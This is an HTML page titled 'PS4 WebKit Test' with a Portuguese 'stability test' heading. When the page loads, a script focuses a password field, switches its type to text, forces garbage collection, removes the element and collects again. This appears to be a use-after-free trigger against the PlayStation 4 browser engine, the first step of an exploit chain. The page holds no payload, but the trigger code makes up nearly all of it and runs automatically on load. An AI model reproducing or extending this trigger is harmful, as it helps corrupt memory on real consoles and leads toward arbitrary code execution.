<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 WebKit Test</title>
<script>

function gc() {
    function gcRec(n) {
          if (n < 1)
              return {};
          var temp = {i: "ab" + i + (i / 100000)};
          temp += "foo";
          gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
    gcRec(10);
}


function triggerBug() {
    var input = document.getElementById("target_input");
    if (!input) return;    
    input.focus();
   
    setTimeout(function() {
        input.type = "text";  
     
        gc();        
        if (input.parentNode) {
            input.parentNode.removeChild(input);
        }
        
        gc();
    }, 10);
}

function startTest() {
   
    setTimeout(triggerBug, 500);
}
</script>
</head>
<body onload="startTest()">
    <h2>Teste de Estabilidade WebKit (PS4)</h2>
    <form>
        <input id="target_input" type="password" name="password" autocomplete="current-password">
    </form>
</body>
</html>
